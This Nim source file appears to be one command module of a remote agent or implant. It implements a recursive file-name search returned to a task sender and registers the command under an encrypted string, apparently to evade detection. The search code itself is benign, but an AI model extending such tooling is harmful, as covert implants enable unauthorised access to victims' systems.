import std/[os, json, strutils]
import core/types
import commands/registry
import crypto/strenc

proc findExecute(taskId: string, params: JsonNode, state: AgentState,
                 send: SendMsg): TaskResult =
  let root    = params{"path"}.getStr(".").strip()
  let pattern = params{"pattern"}.getStr("").strip()

  let fullRoot = if isAbsolute(root): root else: state.cwd / root

  if not dirExists(fullRoot) and not fileExists(fullRoot):
    return TaskResult(output: "No such path: " & fullRoot,
                      status: "error", completed: true)

  var matches: seq[string] = @[]
  try:
    for entry in walkDirRec(fullRoot):
      let name = lastPathPart(entry)
      if pattern.len == 0 or name.contains(pattern):
        matches.add(entry)
    if matches.len == 0:
      return TaskResult(output: "(no results)", status: "success", completed: true)
    return TaskResult(output: matches.join("\n"), status: "success", completed: true)
  except Exception as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initFind*() =
  register(hidstr("find"), findExecute)
